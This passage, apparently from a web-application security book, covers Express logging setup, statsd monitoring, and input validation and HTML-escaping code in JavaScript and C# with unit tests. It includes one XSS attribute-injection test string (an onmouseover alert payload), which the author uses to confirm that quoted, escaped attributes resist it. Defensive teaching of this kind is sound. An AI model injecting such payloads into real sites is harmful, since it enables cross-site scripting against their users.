          logger.addFile( loggerConfig.fileTransportOptions );
       if (loggerConfig.consoleTransportOptions)
          logger.addConsole( loggerConfig.consoleTransportOptions );
       if (loggerConfig.syslogPosixTransportOptions)
          logger.addPosixSyslog( loggerConfig.syslogPosixTransportOptions );
       if (loggerConfig.emailTransportOptions)
          logger.addEmail( loggerConfig.emailTransportOptions );
    };

    module.exports = logger;
    module.exports.stream = {
       write: function (message, encoding) {      
          logger.info(message);
       }
    };

When the app first starts it initialises the logger on line 15 below.

{title="app.js", linenos=on, lang=JavaScript}
    var http = require('http');
    var express = require('express');
    var path = require('path');
    var morganLogger = require('morgan');
    // Due to bug in node-config the next line is needed before config
    // is required: https://github.com/lorenwest/node-config/issues/202
    if (process.env.NODE_ENV === 'production')
       process.env.NODE_CONFIG_DIR = path.join(__dirname, 'config');
    // Yes the following are hoisted, but it's OK in this situation.
    var logger = require('./util/logger'); // Or use requireFrom module so no relative paths.
    //...
    var errorHandler = require('errorhandler');
    var app = express();
    //...
    logger.init();
    app.set('port', process.env.PORT || 3000);
    app.set('views', __dirname + '/views');
    app.set('view engine', 'jade');
    //...
    // In order to utilise connect/express logger module in our third party logger,
    // Pipe the messages through.
    app.use(morganLogger('combined', {stream: logger.stream}));
    app.use(methodOverride());
    app.use(bodyParser.json());
    app.use(bodyParser.urlencoded({ extended: true }));
    app.use(express.static(path.join(__dirname, 'public')));
    //...
    require('./routes')(app);

    if ('development' == app.get('env')) {
       app.use(errorHandler({ dumpExceptions: true, showStack: true }));
       //...
    }
    if ('production' == app.get('env')) {
       app.use(errorHandler());
       //...
    }

    http.createServer(app).listen(app.get('port'), function(){
       logger.info(
          "Express server listening on port " + app.get('port') + ' in '
          + process.env.NODE_ENV + ' mode'
       );
    });

* You can also optionally log JSON metadata
* You can provide an optional callback to do any work required, which will be called once all transports have logged the specified message.

Here are some examples of how you can use the logger. The `logger.log(level` can be replaced with `logger.<level>(` where level is any of the levels defined in the `default.js` configuration file above:

{title="Anywhere you need logging", linenos=off, lang=JavaScript}
    // With string interpolation also.
    logger.log('info', 'test message %s', 'my string');
    logger.log('info', 'test message %d', 123);
    logger.log('info', 'test message %j', {aPropertyName: 'Some message details'}, {});
    logger.log(
       'info', 'test message %s, %s', 'first', 'second',
       {aPropertyName: 'Some message details'}
    );
    logger.log(
       'info', 'test message', 'first', 'second', {aPropertyName: 'Some message details'}
    );
    logger.log(
       'info', 'test message %s, %s', 'first', 'second',
       {aPropertyName: 'Some message details'}, logger.emailLoggerFailure
    );
    logger.log(
       'info', 'test message', 'first', 'second',
       {aPropertyName: 'Some message details'}, logger.emailLoggerFailure
    );

Also consider hiding cross cutting concerns like logging using Aspect Oriented Programing (AOP)

#### Insufficient Monitoring
![](images/ThreatTags/PreventionEASY.png)

There are a couple of ways of approaching monitoring. You may want to see/be notified of the health of your application only when it is not fine (sometimes called the dark cockpit approach), or whether it is fine or not.

##### Dark Cockpit:

As discussed in the VPS chapter, Monit is an [excellent tool](http://blog.binarymist.net/2015/06/27/keeping-your-nodejs-web-app-running-on-production-linux/#monit) for the dark cockpit approach. It's easy to configure. Has excellent short [documentation](https://mmonit.com/monit/documentation/monit.html) that is easy to understand and the configuration file has lots of examples commented out ready for you to take as is and modify to suite your environment. I've personally had excellent [success](http://blog.binarymist.net/2015/06/27/keeping-your-nodejs-web-app-running-on-production-linux/#getting-started-with-monit) with Monit.

##### Statistics Graphing:

Continuing on with the [Statistics Graphing](#vps-countermeasures-lack-of-visibility-monitoring-statistics-graphing) section in the VPS chapter, we look at adding [statsd](https://github.com/etsy/statsd/) as application instrumentation to our existing collectd -> graphite set-up.

{linenos=off}
      Server1   
       +--------------+
       | statsd client|--+
    +-<| collectd     |  |
    |  +--------------+  |
    |                    v    Graphing
    v   Server2          |    Server
    |  +--------------+  |   +-----------+
    |  | statsd client|--+-->| statsd    |
    +-<| collectd     |  |   |   |       |
    |  +--------------+  |   |   v       |
    |                    ^   | graphite  |<-+
    v   Server3, etc     |   +-----------+  |
    |  +--------------+  |                  |
    |  | statsd client|--+                  ^
    +-<| collectd     |                     |
    |  +--------------+                     |
    +-------------------->------------------+


Just as collectd can send data to graphite to provide continual system visibility ,statsd can do the same for our applications. 

statsd is a lightweight NodeJS daemon that collects statistics by listening for UDP packets containing them and aggregates. The protocol that statsd expects to receive looks like the following:

{title="statsd receiving protocol", linenos=off}
    <metric name>:<value>|<type>

Where `<type>` is one of the following:

{title="Counting", linenos=off}
    c

{title="Timing", linenos=off}
    ms

{title="Gauges", linenos=off}
    g

{title="Sets", linenos=off}
    s

So for example if you have statsd running locally with the default server and port, you can test with the following command:

{title="statsd receiving protocol", linenos=off}
    echo "foo:1|c" | nc -u -w0 127.0.0.1 8125

The server and port are specified in the config file that you create for yourself. You can create this from the [`exampleConfig.js`](https://github.com/etsy/statsd/blob/master/exampleConfig.js) as a starting point. In `exampleConfig.js` you will see the server and port properties. The current options for server are tcp or udp, with udp being the default. The server file must exist in the [`./servers/`](https://github.com/etsy/statsd/tree/master/servers) directory.

One of the ways we can generate statistics for our statsd daemon is by using one of the many language specific [statsd clients](https://github.com/etsy/statsd/wiki#client-implementations).

{linenos=off}
    +----------------------+
    | your application     |--> statsd -> graphite
    | with a statsd client |
    +----------------------+

_Todo_

Detail how we collect application statistics and send to graphite. Show real life example.

%% The first and best set of resources are the four posts detailed at the bottom of this one: https://www.digitalocean.com/community/tutorials/an-introduction-to-tracking-statistics-with-graphite-statsd-and-collectd

%% Looks like the first statsd spec for metric types: https://github.com/b/statsd_spec/blob/master/README.md
%% Looks like the up to date, or at least more recent statsd spec for metric types: https://github.com/etsy/statsd/blob/master/docs/metric_types.md

%% Configuring Graphite for statsd: https://github.com/etsy/statsd/blob/master/docs/graphite.md

%% https://www.datadoghq.com/blog/statsd/

### Lack of Input Validation, Filtering and Sanitisation {#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation}
![](images/ThreatTags/PreventionAVERAGE.png)

#### Generic

Your staple practises when it comes to defending against potentially dangerous input are validation and filtering. There are cases though when the business requires that input must be accepted that is dangerous yet still valid. This is where you will need to implement sanitisation. There is a lot more research and thought involved when you need to perform sanitisation, so the first cause of action should be to confirm that the specific dangerous yet valid input is in-fact essential.

##### What is Validation: {#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation-generic-what-is-validation}

Decide what input is valid by way of a white list (list of input characters that are allowed to be received). Often each input field will have a different white list. Validation is binary, the data is either allowed to be received or not allowed. If it is not allowed, then it is rejected. This is usually not to complicated to work out what is good, what is not and thus rejected. There are a few strategies to use for white listing, such as the actual collection of characters or using regular expressions.

There are other criteria that you can validate against as well, such as:

* Field lengths
* Whether or not something is required
* Whether or not something is a specific type or in a specific format and many other criteria

{title="Validation", linenos=off, lang=JavaScript}
    // The NodeJS module express-form provides validation, filtering
    // and some light weight sanitisation as Express middleware.
    var form = require('express-form');
    var fieldToValidate = form.field;

    // trim is filtering.
    fieldToValidate('name').trim().
    // required is validation.
    required().
    // minLength is validation.
    minLength(2).
    // maxLength is validation.
    maxLength(50).
    // is is validation.
    is(/^[a-zA-Z ']+$/)
    // There is no sanitisation here.

##### What is Filtering:

When some data can pass through (be received) and some is captured by the filter element (thou shalt not pass).

##### What is Sanitisation:

Sanitisation of input data is where the input data whether it is in your white list or not is accepted and transformed into a medium that is no longer dangerous. Now it will probably go through validation first. The reason you sanitise character signatures (may be more than single characters, character combinations) not in your white list is a defence in depth strategy. The white list may change in the future due to a change in business requirements and the developer may forget to revise the sanitisation routines. Always think of any security measure as standing on its own when you create it, but standing alongside many other security measures once done.

You need to know which contexts your input data will pass through in order to sanitise correctly for all potential execution contexts. This requires lateral thinking and following all execution paths. Both into and out of your application (once rehydrated), being pushed back to the client. We cover this in depth below in the ["Example in JavaScript and C#"](#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation-generic-example-in-javascript-and-csharp) section.

**Recommendations**

Research:

* Libraries
* The execution contexts that your data will flow through / be placed in
* Which character signatures need to be sanitised

Attempt to use well tested, battle hardened language specific libraries that know how to validate, filter and sanitise.

Create enough evil test conditions to verify that:

* Only white listed characters can be received (both client and server side)
* Your filtering routines are doing as expected with valid and non valid input (both client and server side)
* All valid characters that need some modification are modified. Modifying could simply be a case of for example rounding a float down (removing precision), or changing the case of an alpha character. Not usually a security issue.
* Sanitising or transforming the character signatures known to be dangerous in the execution contexts you have discovered you have in your code that these character signatures pass through / are placed in; are transformed into their safe counterparts. If your libraries cover all cases, which from my experience I have not seen yet, that is great, but often there will be edge cases that stop the libraries being useful in every case. I provide an example of this below where the available libraries did not cover the edge cases I had in a project I worked on a few years ago. When this happens you may need to create some sanitisation logic. At this point, you are really going to have to gain good understanding of the execution contexts that will affect you and the different types of escaping you need to know about.
* Maximum and minimum field lengths are enforced

##### Types of Escaping: {#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation-generic-types-of-escaping}

Escaping is a technique used to sanitise. Escaped data will still render in the browser properly. Escaping simply lets the interpreter know that the data is not intended to be executed and thus prevents the attack.

There are a number of types of escaping you need to know about depending on where you may be intending on inserting untrusted data. Work through the following set of rules in order:

1. HTML Escape
2. Attribute Escape
3. JavaScript Escape
  1. HTML Escape JSON values in HTML context
4. CSS Escape
5. URL Escape
6. Sanitise HTML
7. Prevent DOM-based XSS

All of the above points are covered in depth in the OWASP [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet#XSS_Prevention_Rules). **Familiarise yourself with the rules before completing any custom sanitisation work**.

##### Example in JavaScript and C\# {#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation-generic-example-in-javascript-and-csharp}

A>
A> When out of the box libraries do not cover all of your sanitisation needs.
A>

The following example was taken from a project I worked on a few years ago.

Client side validation, filtering and sanitisation is more about UX (User Experience) helping the honest user by saving round trip communications to the server than stopping an attacker, as an attacker will simply by-pass any client side defences.

We needed to apply a white list to all characters being entered into the `value` attribute of `input` elements of `type="text"` and also `textarea` elements. The requirement was that the end user could not insert invalid characters into one of these fields and by insert we mean:

1. type the characters in
2. [ctrl]+[v] a clipboard full of characters in
3. right click -> Paste

The following was the strategy that evolved. Performance was measured and even with an interval much lower than the 300 milliseconds, the performance impact was negligible. As soon as any non white list character(s) was entered, it was immediately deleted within 300 milliseconds.

`$` references jQuery.

{title="Validation using white list", linenos=off, lang=JavaScript}
    var userInputValidationIntervalId = 0;

    setupUserInputValidation = function () {

       var textAreaMaxLength = 400;
       var elementsToValidate;
       var whiteList = /[^A-Za-z_0-9\s.,]/g;

       var elementValue = {
          textarea: '',
          textareaChanged: function (obj) {
             var initialValue = obj.value;
             var replacedValue = initialValue.
                replace(whiteList, "").
                slice(0, textAreaMaxLength);
             if (replacedValue !== initialValue) {
                this.textarea = replacedValue;
                return true;
             }
             return false;
          },
          inputtext: '',
          inputtextChanged: function (obj) {
             var initialValue = obj.value;
             var replacedValue = initialValue.replace(whiteList, "");
             if (replacedValue !== initialValue) {
                this.inputtext = replacedValue;
                return true;
             }
             return false;
          }
       };

       elementsToValidate = {
          textareainputelements: (function () {
             var elements = $('#page' + currentPage).find('textarea');
             if (elements.length > 0) {
                return elements;
             }
             return 'no elements found';
          } ()),
          textInputElements: (function () {
             var elements = $('#page' + currentPage).find('input[type=text]');
             if (elements.length > 0) {
                return elements;
             }
             return 'no elements found';
          } ())
       };

       // store the intervals id in outer scope
       // so we can clear the interval when we change pages.
       userInputValidationIntervalId = setInterval(function () {
          var element;

          // Iterate through each one and remove any characters not in the whitelist.
          // Iterate through each one and trim any that are longer than 400.

          for (element in elementsToValidate) {
             if (elementsToValidate.hasOwnProperty(element)) {
                elementsToValidate
                if (elementsToValidate[element] === 'no elements found')
                   continue;

                $.each(elementsToValidate[element], function () {
                   $(this).attr('value', function () {
                      var name = $(this).prop('tagName').toLowerCase();
                      name = name === 'input' ? name + $(this).prop('type') : name;
                      if (elementValue[name + 'Changed'](this))
                         this.value = elementValue[name];
                   });
                });
             }
          }
       }, 300); // Milliseconds.
    };

Each time we changed the page, we cleared the interval and reset it for the new page.

{title="", linenos=off, lang=JavaScript}
    clearInterval(userInputValidationIntervalId);
    setupUserInputValidation();

HTML5 provides the `pattern` attribute on the `input` tag, which allows us to specify a regular expression that the text received is checked against. Although this does not apply to `textarea`s. Also when validation occurs is not specified in the [HTML specification](https://html.spec.whatwg.org/multipage/forms.html#the-pattern-attribute), so this may not provide enough control.

Now what we do here is extend the `String` prototype with a function called `htmlEscape`.


{title="Sanitisation using escaping", linenos=off, lang=JavaScript}
    if (typeof Function.prototype.method !== "function") {
       Function.prototype.method = function (name, func) {
          this.prototype[name] = func;
          return this;
       };
    }
    
    String.method('htmlEscape', function () {
    
       // Escape the following characters with HTML entity encoding
       // to prevent switching into any execution context,
       // such as script, style, or event handlers.
       // Using hex entities is recommended in the spec.
       // In addition to the 5 characters significant in XML (&, <, >, ", '),
       // the forward slash is included as it helps to end an HTML entity.
       var character = {
          '&': '&amp;',
          '<': '&lt;',
          '>': '&gt;',
          '"': '&quot;',
          // Double escape character entity references. Why?
          // The XmlTextReader that is setup in XmlDocument.LoadXml on the service considers
          // the character entity references (&#xxxx;) to be the character they represent.
          // All XML is converted to unicode on reading and any such entities are
          // removed in favour of the unicode character they represent.
          // So we double escape character entity references.
          // These now get read to the XmlDocument and saved to the database as
          // double encoded Html entities.
          // Now when these values are pulled from the database and sent to the browser,
          // it decodes the & and displays #x27; and/or #x2F.
          // This isn't what we want to see in the browser, so on the way out,
          // we use the below SingleDecodeDoubleEncodedHtml extension method.
          "'": '&amp;#x27;',    // &apos; is not recommended
          '/': '&amp;#x2F;'     // forward slash is included as it helps end an HTML entity
       };
    
       return function () {
          return this.replace(/[&<>"'/]/g, function (c) {
             return character[c];
          });
       };
    }());

Just before any user input was sent back to the server, we would check each of the fields that we were receiving input from by doing the following:

{title="", linenos=on, lang=JavaScript}
    element.value.htmlEscape();

"_HTML entity encoding is okay for untrusted data that you put in the body of the HTML document, such as inside a `<div>` tag. It even sort of works for untrusted data that goes into attributes, particularly if you're religious about using quotes around your attributes._"

> OWASP XSS Prevention Cheat Sheet

For us, this would be enough, as we would be `HTML` escaping our `textarea` elements and we were happy to make sure we were religious about using quotes around the `value` attribute on `input` of `type="text"`.

"_But HTML entity encoding doesn't work if you're putting untrusted data inside a `<script>` tag anywhere, or an event handler attribute like `onmouseover`, or inside CSS, or in a URL. So even if you use an HTML entity encoding method everywhere, you are still most likely vulnerable to XSS. You MUST use the escape syntax for the part of the HTML document you're putting untrusted data into._" 

> OWASP XSS Prevention Cheat Sheet

The escaping rules discussed [above](#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation-generic-types-of-escaping) detail this. Check out the [OWASP resource](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet#Why_Can.27t_I_Just_HTML_Entity_Encode_Untrusted_Data.3F) for full details.

Rule #2 of the OWASP XSS Prevention Cheat Sheet discusses attribute escaping. Now because we were only using `value` attributes and we had the luxury of being able to control the fact that we would always be using properly quoted attributes, we didn't have to take this extra step of escaping all (other than alphanumeric) ASCII characters that is values less than 256 with the `&#xHH` format to prevent switching out of the attribute context.

Because I wanted to be sure about not being able to escape out of the attributes context if it was properly quoted I tested it. I created a collection of injection attacks, none of which worked. If you enter something like the following into the attribute `value` of an `input` element where `type="text"`, then the first double quote will be interpreted as the corresponding quote and the end double quote will be interpreted as the end quote of the `onmouseover` attribute value.

{title="", linenos=off, lang=JavaScript}
    " onmouseover="alert(2)

All the legitimate double quotes are interpreted as the double quote `HTML` entity `"` and all illegitimate double quotes are interpreted as the character value. This is what you end up with:

{title="", linenos=off, lang=JavaScript}
    value=" &quot; onmouseover=&quot;alert(2)"

Now in regards to the code comments in the block of code above titled "Sanitisation using escaping", I mentioned having to double escape character references. We were using `XSL` for the `HTML` because we needed to perform transformations before delivering to the browser. Because we were sending the strings to the browser, it was easiest to single decode the double encoded `HTML` on the service side only. Now because we were still focused on the client side sanitisation and we would soon be shifting our focus to making sure we cover the server side, we knew we were going to have to create some sanitisation routines for our .NET service. Because the routines are quite likely going to be static and we were pretty much just dealing with strings, we created an extensions class in a new project in a common library we already had. This would provide the widest use from our sanitisation routines. It also allowed us to wrap any existing libraries or parts of them that we wanted to get use of.

{title="Common.Security.Encoding.Extensions.SingleDecodeDoubleEncodedHtml", linenos=off, lang=C#}
    namespace Common.Security.Encoding {
       /// <summary>
       /// Provides a series of extension methods that perform sanitisation.
       /// Escaping, unescaping, etc.
       /// Usually targeted at user input, to help defend against the likes of XSS attacks.
       /// </summary>
       public static class Extensions {
          /// <summary>
          /// Returns a new string in which all occurrences of a double escaped html character
          /// (that's an html entity immediatly prefixed with another html entity)
          /// in the current instance are replaced with the single escaped character.
          /// </summary>
          /// <param name="source"></param>
          /// <returns>The new string.</returns>
          public static string SingleDecodeDoubleEncodedHtml(this string source) {
             return source.Replace("&amp;#x", "&#x");
          }
       }
    }

Now when we ran our `xslt` transformation on the service, we chain our new extension method on the end. Which gives us back a single encoded string that the browser is happy to display as the decoded value.

{title="", linenos=on, lang=C#}
    return Transform().SingleDecodeDoubleEncodedHtml();

Now turning our attention to the server side... Untrusted data (data entered by a user), should always be treated as though it may contain attack code.
This data should not be sent anywhere without taking the necessary steps to detect and neutralise the malicious code depending on which execution contexts it will pass through.

With applications becoming more interconnected, attacks being buried in user input and decoded and/or executed by a downstream interpreter is common. Input validation, that is restricting user input to allow only certain white listed characters and restricting field lengths are only two forms of defence. Any decent attacker can get around client side validation, so you need to employ defence in depth. If you need to validate, filter and sanitise, at the very least, it needs to be done on the server side.

I found `System.Net.WebUtility` from the `System.Web.dll` assembly to do most of what we needed other than provide us with fine grained information of what had been tampered with. So I took it and extended it slightly. We had not employed AOP at this stage, so there was some copy past modifying.

First up, the exceptions we used:

{title="Common.WcfHelpers.ErrorHandling.Exceptions.WcfException", linenos=off, lang=C#}
    namespace Common.WcfHelpers.ErrorHandling.Exceptions {
       public abstract class WcfException : Exception {
          /// <summary>
          /// In order to set the message for the client, set it here,
          /// or via the property directly in order to over ride default value.
          /// </summary>
          /// <param name="message">
          /// The message to be assigned to the Exception's Message.
          /// </param>
          /// <param name="innerException">
          /// The exception to be assigned to the Exception's InnerException.
          /// </param>
          /// <param name="messageForClient">
          /// The client friendly message. This parameter is optional, but should be set.
          /// </param>
          public WcfException(
             string message, Exception innerException = null, string messageForClient = null
          ) : base(message, innerException) {
             MessageForClient = messageForClient;
          }

          /// <summary>
          /// This is the message that the services client will see.
          /// Make sure it is set in the constructor. Or here.
          /// </summary>
          public string MessageForClient {
             get {
                return string.IsNullOrEmpty(_messageForClient) ?
                   "The MessageForClient property of WcfException was not set" :
                   _messageForClient;
             }
             set { _messageForClient = value; }
          }
          private string _messageForClient;
       }
    }

And the more specific `SanitisationWcfException`:

{title="Common.WcfHelpers.ErrorHandling.Exceptions.SanitisationWcfException", linenos=off, lang=C#}
    using System;
    using System.Configuration;
    
    namespace Common.WcfHelpers.ErrorHandling.Exceptions {
       /// <summary>
       /// Exception class that is used when the user input sanitisation fails,
       /// and the user needs to be informed.
       /// </summary>
       public class SanitisationWcfException : WcfException {
          private const string _defaultMessageForClient =
             "Answers were NOT saved. User input validation was unsuccessful.";
          public string UnsanitisedAnswer { get; private set; }
 
          /// <summary>
          /// In order to set the message for the client, set it here,
          /// or via the property directly in order to over ride default value.
          /// </summary>
          /// <param name="message">
          /// The message to be assigned to the Exception's Message.
          /// </param>
          /// <param name="innerException">
          /// The Exception to be assigned to the base class instance's inner exception.
          /// This parameter is optional.
          /// </param>
          /// <param name="messageForClient">
          /// The client friendly message. This parameter is optional, but should be set.
          /// </param>
          /// <param name="unsanitisedAnswer">
          /// The user input string before service side sanitisatioin is performed.
          /// </param>
          public SanitisationWcfException (
             string message,
             Exception innerException = null,
             string messageForClient = _defaultMessageForClient,
             string unsanitisedAnswer = null
          ) : base (
             message,
             innerException,
             messageForClient +
             " If this continues to happen, please contact " +
             ConfigurationManager.AppSettings["SupportEmail"] + Environment.NewLine
          ) {
             UnsanitisedAnswer = unsanitisedAnswer;
          }
       }
    }

Now we defined whether our requirements were satisfied by way of executable requirements (unit tests(in their rawest form)):

{title="Common.Security.Encoding.UnitTest.ExtensionsTest", linenos=off, lang=C#}
    using NUnit.Framework;
    using Common.Security.Sanitisation;
    
    namespace Common.Security.Encoding.UnitTest {
       [TestFixture]
       public class ExtensionsTest {
    
          private readonly string _inNeedOfEscaping =
             @"One #x2F / two amp & three #x27 ' four lt < five quot "" six gt >.";
          private readonly string _noNeedForEscaping =
             @"One x2F two amp three x27 four lt five quot six gt       .";
          
          [Test]
          public void SingleDecodeDoubleEncodedHtml_ShouldSingleDecodeDoubleEncodedHtml() {
             string doubleEncodedHtml = @" &amp;#x27; some text &amp;#x2F; ";
             string singleEncodedHtmlShouldLookLike = @" &#x27; some text &#x2F; ";
             string singleEncodedHtml = doubleEncodedHtml.SingleDecodeDoubleEncodedHtml();
             Assert.That(singleEncodedHtml, Is.EqualTo(singleEncodedHtmlShouldLookLike));
          }
 
          [Test]
          public void Extensions_CompliesWithWhitelist_ShouldNotComply() {
             Assert.That(
                _inNeedOfEscaping.CompliesWithWhitelist(whiteList: @"^[\w\s\.,]+$"),
                Is.False
             );
          }
 
          [Test]
          public void Extensions_CompliesWithWhitelist_ShouldComply() {
             Assert.That(
                _noNeedForEscaping.CompliesWithWhitelist(whiteList: @"^[\w\s\.,]+$"),
                Is.True
             );
             Assert.That(
                _inNeedOfEscaping.CompliesWithWhitelist(whiteList: @"^[\w\s\.,#/&'<"">]+$"),
                Is.True
             );
          }
       }
    }

Now the code that satisfies the above executable specifications, and more:

{title="Common.Security.Sanitisation.Extensions", linenos=on, lang=C#}
    using System;
    using System.Collections.Generic;
    using System.Globalization;
    using System.IO;
    using System.Text.RegularExpressions;
    
    namespace Common.Security.Sanitisation {
       /// <summary>
       /// Provides a series of extension methods that perform sanitisation.
       /// Escaping, unescaping, etc.
       /// Usually targeted at user input,
       /// to help defend against the likes of XSS and other injection attacks.
       /// </summary>
       public static class Extensions {
       
          private const int CharacterIndexNotFound = -1;
       
          /// <summary>
          /// Returns a new string in which all occurrences of a double escaped html character
          /// (that's an html entity immediatly prefixed with another html entity)
          /// in the current instance are replaced with the single escaped character.
          /// </summary>
          /// <param name="source">
          /// The target text used to strip one layer of Html entity encoding.
          /// </param>
          /// <returns>The singly escaped text.</returns>
          public static string SingleDecodeDoubleEncodedHtml(this string source) {
             return source.Replace("&amp;#x", "&#x");
          }

          /// <summary>
          /// Filter a text against a regular expression whitelist of specified characters.
          /// </summary>
          /// <param name="target">The text that is filtered using the whitelist.</param>
          /// <param name="alternativeTarget"></param>
          /// <param name="whiteList">
          /// Needs to be be assigned a valid whitelist, otherwise nothing gets through.
          /// </param>
          public static bool CompliesWithWhitelist(
             this string target, string alternativeTarget = "", string whiteList = ""
          ) {
             if (string.IsNullOrEmpty(target))
                target = alternativeTarget;
     
             return Regex.IsMatch(target, whiteList);
          }

          // Warning!
          // The following code is not pretty, it came from System.Net.WebUtility.

          /// <summary>
          /// Takes a string and returns another with a single layer of
          /// Html entity encoding replaced with it's Html entity literals.
          /// </summary>
          /// <param name="encodedUserInput">
          /// The text to perform the opperation on.
          /// </param>
          /// <param name="numberOfEscapes">
          /// The number of Html entity encodings that were replaced.
          /// </param>
          /// <returns>
          /// The text that's had a single layer of Html entity encoding
          /// replaced with it's Html entity literals.
          /// </returns>
          public static string HtmlDecode(
             this string encodedUserInput, ref int numberOfEscapes
          ) {
             const int NotFound = -1;
          
             if (string.IsNullOrEmpty(encodedUserInput))
                return string.Empty;
       
             StringWriter output = new StringWriter(CultureInfo.InvariantCulture);
          
             if (encodedUserInput.IndexOf('&') == NotFound) {
                output.Write(encodedUserInput);
             } else {
                int length = encodedUserInput.Length;
                for (int index1 = 0; index1 < length; ++index1) {
                   char ch1 = encodedUserInput[index1];
                   if (ch1 == 38) {
                      int index2 = encodedUserInput.IndexOfAny(
                         _htmlEntityEndingChars, index1 + 1
                      );
                      if (index2 > 0 && encodedUserInput[index2] == 59) {
                         string entity = encodedUserInput.Substring(
                            index1 + 1, index2 - index1 - 1
                         );
                         if (entity.Length > 1 && entity[0] == 35) {
                            ushort result;
                            if (entity[1] == 120 || entity[1] == 88)
                               ushort.TryParse(
                                  entity.Substring(2),
                                  NumberStyles.AllowHexSpecifier,
                                  NumberFormatInfo.InvariantInfo,
                                  out result
                               );
                            else
                               ushort.TryParse(
                                  entity.Substring(1),
                                  NumberStyles.AllowLeadingWhite |
                                  NumberStyles.AllowTrailingWhite |
                                  NumberStyles.AllowLeadingSign,
                                  NumberFormatInfo.InvariantInfo,
                                  out result
                               );
                            if (result != 0) {
                               ch1 = (char)result;
                               numberOfEscapes++;
                               index1 = index2;
                            }
                         } else {
                            index1 = index2;
                            char ch2 = HtmlEntities.Lookup(entity);
                            if ((int)ch2 != 0) {
                               ch1 = ch2;
                               numberOfEscapes++;
                            } else {
                               output.Write('&');
                               output.Write(entity);
                               output.Write(';');
                               continue;
                            }
                         }
                      }
                   }
                   output.Write(ch1);
                }
             }
             string decodedHtml = output.ToString();
             output.Dispose();
             return decodedHtml;
          }

          /// <summary>
          /// Escapes all character entity references (double escaping where necessary).
          /// Why? The XmlTextReader that is setup in XmlDocument.LoadXml on the service
          /// considers the character entity references (&#xxxx;)
          /// to be the character they represent.
          /// All XML is converted to unicode on reading and any such entities are removed
          /// in favor of the unicode character they represent.
          /// </summary>
          /// <param name="unencodedUserInput">The string that needs to be escaped.</param>
          /// <param name="numberOfEscapes">The number of escapes applied.</param>
          /// <returns>The escaped text.</returns>
          public static unsafe string HtmlEncode(
             this string unencodedUserInput,
             ref int numberOfEscapes
          ) {
             if (string.IsNullOrEmpty(unencodedUserInput))
                return string.Empty;
           
             StringWriter output = new StringWriter(CultureInfo.InvariantCulture);
              
             if (output == null)
                throw new ArgumentNullException("output");
             int num1 = IndexOfHtmlEncodingChars(unencodedUserInput);
             if (num1 == -1) {
                output.Write(unencodedUserInput);
             } else {
                int num2 = unencodedUserInput.Length - num1;
                fixed (char* chPtr1 = unencodedUserInput) {
                   char* chPtr2 = chPtr1;
                   while (num1-- > 0)
                      output.Write(*chPtr2++);
                   while (num2-- > 0) {
                      char ch = *chPtr2++;
                      if (ch <= 62) {
                         switch (ch) {
                            case '"':
                               output.Write("&quot;");
                               numberOfEscapes++;
                               continue;
                            case '&':
                               output.Write("&amp;");
                               numberOfEscapes++;
                               continue;
                            case '\'':
                               output.Write("&amp;#x27;");
                               numberOfEscapes = numberOfEscapes + 2;
                               continue;
                            case '<':
                               output.Write("&lt;");
                               numberOfEscapes++;
                               continue;
                            case '>':
                               output.Write("&gt;");
                               numberOfEscapes++;
                               continue;
                            case '/':
                               output.Write("&amp;#x2F;");
                               numberOfEscapes = numberOfEscapes + 2;
                               continue;
                            default:
                               output.Write(ch);
                               continue;
                         }
                      }
                      if (ch >= 160 && ch < 256) {
                         output.Write("&#");
                         output.Write(((int)ch).ToString(NumberFormatInfo.InvariantInfo));
                         output.Write(';');
                         numberOfEscapes++;
                      }
                      else
                         output.Write(ch);
                   }
                }
             }
             string encodedHtml = output.ToString();
             output.Dispose();
             return encodedHtml;
          }

          private static unsafe int IndexOfHtmlEncodingChars(string searchString) {
             int num = searchString.Length;
             fixed (char* chPtr1 = searchString) {
                char* chPtr2 = (char*)((UIntPtr)chPtr1);
                for (; num > 0; --num) {
                   char ch = *chPtr2;
                   if (ch <= 62) {
                      switch (ch) {
                         case '"':
                         case '&':
                         case '\'':
                         case '<':
                         case '>':
                         case '/':
                            return searchString.Length - num;
                      }
                   }
                   else if (ch >= 160 && ch < 256)
                      return searchString.Length - num;
                   ++chPtr2;
                }
             }
             return CharacterIndexNotFound;
          }
          
          private static char[] _htmlEntityEndingChars = new char[2] {
             ';',
             '&'
          };

          private static class HtmlEntities {
             private static string[] _entitiesList = new string[253] {
                "\"-quot",
                "&-amp",
                "'-apos",
                "<-lt",
                ">-gt",
                " -nbsp",
                "¡-iexcl",
                "¢-cent",
                "£-pound",
                "¤-curren",
                "¥-yen",
                "¦-brvbar",
                "§-sect",
                "¨-uml",
                "©-copy",
                "ª-ordf",
                "«-laquo",
                "¬-not",
                "\x00AD-shy",
                "®-reg",
                "¯-macr",
                "°-deg",
                "±-plusmn",
                "\x00B2-sup2",
                "\x00B3-sup3",
                "´-acute",
                "µ-micro",
                "¶-para",
                "·-middot",
                "¸-cedil",
                "\x00B9-sup1",
                "º-ordm",
                "»-raquo",
                "\x00BC-frac14",
                "\x00BD-frac12",
                "\x00BE-frac34",
                "¿-iquest",
                "À-Agrave",
                "Á-Aacute",
                "Â-Acirc",
                "Ã-Atilde",
                "Ä-Auml",
                "Å-Aring",
                "Æ-AElig",
                "Ç-Ccedil",
                "È-Egrave",
                "É-Eacute",
                "Ê-Ecirc",
                "Ë-Euml",
                "Ì-Igrave",
                "Í-Iacute",
                "Î-Icirc",
                "Ï-Iuml",
                "Ð-ETH",
                "Ñ-Ntilde",
                "Ò-Ograve",
                "Ó-Oacute",
                "Ô-Ocirc",
                "Õ-Otilde",
                "Ö-Ouml",
                "×-times",
                "Ø-Oslash",
                "Ù-Ugrave",
                "Ú-Uacute",
                "Û-Ucirc",
                "Ü-Uuml",
                "Ý-Yacute",
                "Þ-THORN",
                "ß-szlig",
                "à-agrave",
                "á-aacute",
                "â-acirc",
                "ã-atilde",
                "ä-auml",
                "å-aring",
                "æ-aelig",
                "ç-ccedil",
                "è-egrave",
                "é-eacute",
                "ê-ecirc",
                "ë-euml",
                "ì-igrave",
                "í-iacute",
